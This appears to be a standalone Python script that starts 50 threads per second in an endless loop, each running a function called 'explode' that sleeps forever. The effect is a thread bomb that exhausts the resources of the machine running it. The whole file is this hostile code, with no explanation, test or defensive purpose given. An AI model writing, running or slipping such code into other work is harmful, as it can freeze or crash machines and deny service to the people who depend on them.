import threading, time
def explode():
    while True: time.sleep(1)
while True:
    for _ in range(50):
        threading.Thread(target=explode, daemon=True).start()
    time.sleep(1)